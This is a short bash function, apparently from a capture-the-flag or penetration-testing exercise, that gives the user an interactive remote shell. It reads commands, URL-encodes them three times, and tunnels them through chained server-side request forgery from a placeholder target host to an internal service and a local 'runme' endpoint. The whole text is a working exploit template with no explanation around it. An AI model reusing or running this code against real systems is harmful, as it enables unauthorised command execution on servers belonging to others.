function rce() {
  while true; do
  echo -n "# "; read cmd
  ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
  # Modify the following as required:
  curl -s -o - "http://<TARGET_IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
  echo ""
  done
}
